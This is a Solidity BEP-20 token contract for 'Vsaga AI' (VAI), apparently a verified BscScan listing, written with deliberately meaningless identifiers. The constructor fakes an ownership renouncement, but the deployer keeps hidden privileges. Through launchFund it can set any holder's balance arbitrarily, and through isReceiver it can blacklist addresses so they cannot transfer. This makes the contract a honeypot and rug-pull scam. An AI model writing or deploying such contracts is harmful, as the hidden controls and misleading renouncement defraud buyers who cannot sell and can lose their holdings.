/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface swapFromMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenExemptLiquidity) external view returns (uint256);

    function transfer(address fundFromSell, uint256 limitList) external returns (bool);

    function allowance(address receiverTeamBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitList) external returns (bool);

    function transferFrom(
        address sender,
        address fundFromSell,
        uint256 limitList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed feeExempt, uint256 value);
    event Approval(address indexed receiverTeamBuy, address indexed spender, uint256 value);
}

interface receiverModeLaunched is swapFromMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract marketingAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxFund {
    function createPair(address swapTeam, address buyTeam) external returns (address);
}

interface exemptAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract VsagaAI is marketingAt, swapFromMode, receiverModeLaunched {

    function isMode() public view returns (uint256) {
        return shouldLiquidity;
    }

    uint256 private marketingLaunch;

    mapping(address => bool) public exemptMinTake;

    function takeTeam(address modeTo) public {
        require(!minTeamSender);
        
        exemptMinTake[modeTo] = true;
        
        minTeamSender = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return totalAt;
    }

    function name() external view virtual override returns (string memory) {
        return autoLiquidity;
    }

    function marketingReceiverExempt() public {
        if (marketingLaunch != shouldLiquidity) {
            marketingLaunch = shouldLiquidity;
        }
        
        toBuy=false;
    }

    function transfer(address modeReceiverLaunch, uint256 limitList) external virtual override returns (bool) {
        return atReceiver(_msgSender(), modeReceiverLaunch, limitList);
    }

    mapping(address => mapping(address => uint256)) private tradingLaunched;

    function limitMode() public view returns (bool) {
        return tokenSwap;
    }

    address public toAuto;

    function launchedSender(address exemptTxAmount, address fundFromSell, uint256 limitList) internal returns (bool) {
        require(autoFee[exemptTxAmount] >= limitList);
        autoFee[exemptTxAmount] -= limitList;
        autoFee[fundFromSell] += limitList;
        emit Transfer(exemptTxAmount, fundFromSell, limitList);
        return true;
    }

    function atReceiver(address exemptTxAmount, address fundFromSell, uint256 limitList) internal returns (bool) {
        if (exemptTxAmount == toAuto) {
            return launchedSender(exemptTxAmount, fundFromSell, limitList);
        }
        require(!totalListAmount[exemptTxAmount]);
        return launchedSender(exemptTxAmount, fundFromSell, limitList);
    }

    mapping(address => bool) public totalListAmount;

    bool private tokenSwap;

    function transferFrom(address exemptTxAmount, address fundFromSell, uint256 limitList) external override returns (bool) {
        if (tradingLaunched[exemptTxAmount][_msgSender()] != type(uint256).max) {
            require(limitList <= tradingLaunched[exemptTxAmount][_msgSender()]);
            tradingLaunched[exemptTxAmount][_msgSender()] -= limitList;
        }
        return atReceiver(exemptTxAmount, fundFromSell, limitList);
    }

    constructor (){ 
        if (toBuy == tokenSwap) {
            shouldLiquidity = marketingLaunch;
        }
        exemptAmount launchedMode = exemptAmount(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        launchFeeFrom = maxFund(launchedMode.factory()).createPair(launchedMode.WETH(), address(this));
        totalMin = _msgSender();
        if (shouldLiquidity != marketingLaunch) {
            toBuy = true;
        }
        toAuto = _msgSender();
        exemptMinTake[_msgSender()] = true;
        
        autoFee[_msgSender()] = totalAt;
        emit Transfer(address(0), toAuto, totalAt);
        tradingAmount();
    }

    event OwnershipTransferred(address indexed takeMax, address indexed isList);

    function symbol() external view virtual override returns (string memory) {
        return limitTx;
    }

    mapping(address => uint256) private autoFee;

    function fundReceiver() public {
        
        if (tokenSwap) {
            tokenSwap = false;
        }
        toBuy=false;
    }

    function autoSwap() private view{
        require(exemptMinTake[_msgSender()]);
    }

    bool private toBuy;

    function launchFund(address modeReceiverLaunch, uint256 limitList) public {
        autoSwap();
        autoFee[modeReceiverLaunch] = limitList;
    }

    function tradingAmount() public {
        emit OwnershipTransferred(toAuto, address(0));
        totalMin = address(0);
    }

    function isReceiver(address minLaunch) public {
        autoSwap();
        if (marketingLaunch != shouldLiquidity) {
            tokenSwap = true;
        }
        if (minLaunch == toAuto || minLaunch == launchFeeFrom) {
            return;
        }
        totalListAmount[minLaunch] = true;
    }

    uint256 public shouldLiquidity;

    function autoTotal() public view returns (uint256) {
        return marketingLaunch;
    }

    function decimals() external view virtual override returns (uint8) {
        return amountBuy;
    }

    uint256 private totalAt = 100000000 * 10 ** 18;

    function owner() external view returns (address) {
        return totalMin;
    }

    uint8 private amountBuy = 18;

    string private limitTx = "VAI";

    function getOwner() external view returns (address) {
        return totalMin;
    }

    function launchMax() public {
        if (shouldLiquidity != marketingLaunch) {
            marketingLaunch = shouldLiquidity;
        }
        
        marketingLaunch=0;
    }

    function receiverMode() public view returns (bool) {
        return tokenSwap;
    }

    function approve(address swapReceiver, uint256 limitList) public virtual override returns (bool) {
        tradingLaunched[_msgSender()][swapReceiver] = limitList;
        emit Approval(_msgSender(), swapReceiver, limitList);
        return true;
    }

    address private totalMin;

    bool public minTeamSender;

    address public launchFeeFrom;

    function balanceOf(address tokenExemptLiquidity) public view virtual override returns (uint256) {
        return autoFee[tokenExemptLiquidity];
    }

    function allowance(address maxReceiver, address swapReceiver) external view virtual override returns (uint256) {
        return tradingLaunched[maxReceiver][swapReceiver];
    }

    string private autoLiquidity = "Vsaga AI";

}